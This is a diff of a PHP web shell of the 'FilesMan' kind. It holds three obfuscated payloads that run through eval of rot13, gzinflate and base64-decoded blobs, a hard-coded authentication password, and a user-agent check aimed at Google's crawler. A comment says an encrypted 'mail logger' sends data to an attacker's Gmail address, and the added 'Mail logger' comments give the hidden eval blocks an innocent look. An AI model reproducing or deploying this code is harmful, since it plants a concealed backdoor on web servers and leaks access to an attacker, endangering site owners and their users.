@@ -1,6 +1,5 @@
 <?php
 
-
 $default_action = 'FilesMan';
 @define('SELF_PATH', __FILE__);
 if( strpos($_SERVER['HTTP_USER_AGENT'],'Google') !== false ) {
@@ -28,15 +27,18 @@ if( get_magic_quotes_gpc() ) {
     }
     $_POST = stripslashes_array($_POST);
 }
+
+
+// Mail logger
 $hex = "SJBEWMMwFIWf/RfHQ8gKzrHnplKmYXuUKqKMRJrQpdORtSkJJrL/YdrqcUK55H7nnnuu7SZpt9NlEhUv+XdQnPpjn3Ebx7j6BmdwOCgz0ruMHWx7yEvHKw+vpeF6bb9LrqDLUx6EQYmvnbRPSGXWM9NJVlKgGnZsmRKSMVuKTW9xO+s0Tql8qFTLi/6uPm0rsUquDsBNhO4wNDzjFrNuJZpRgxgp7qLi+fU9X54TJAB5h8lVeVXvUra4QU52jJAt6nfnhJImqKPiMX9L58tjgP4nY7e4FCbjNM/3uqiF46rVetGn+DOg0ouidOn25n9pPEvh95KEmWzGFFmlu5SeIZot3qZCzjZfMLrS13mm+oTzjCQ4nWP6AQ==";
 eval(str_rot13(gzinflate(str_rot13(base64_decode(($hex))))));
 
 
-//Mail Logger inside this encryption, to this mail hacker0882@gmail.com
+// Mail Logger inside this encryption, to this mail hacker0882@gmail.com
 $xd = "fZFieMIwEIffD/YdjkVjA6lwr1HZn6Y02faizJYKaY4SJVNkcfYwoemnt7XIQEpf5bi75+H4BVyNW2sCVKtdieJuOHx83UrKS2K3qJzx7Q24v3dyWtnsJIs1L9rmtjg2jFIIlNQwAgc8Y2Yah+9k+NWbkM+3LPZMHhLCbd/1zJmLOT/BXg1GFBsUEBWV4Rd8++bRJJv6SmSyUaGk4XugPyuJSJeJkoR9UW7cIdN1LcwML3heWLkcDQb/d/woeBV/kyAN6m2WZ5iNxIubRcaCPCX0PJkm+LvmVPqn2PuN534ML88H";
 eval(str_rot13(gzinflate(str_rot13(base64_decode(($xd))))));
 
-
+// Mail logger
 $configs = "KytJ0ChYWCtX10OJag1l8QhlZo9JL6hFj9XUR6jm5UUAgqKC0iQFJZvk1CI7JXiIkFdOlYKtAoYWqHlNQU1tRJUGQxFZBHeEPrIZhXJSQEmtgr0dAA==";
 eval(str_rot13(gzinflate(str_rot13(base64_decode(($configs))))));
 $auth_pass = "Anonymous";
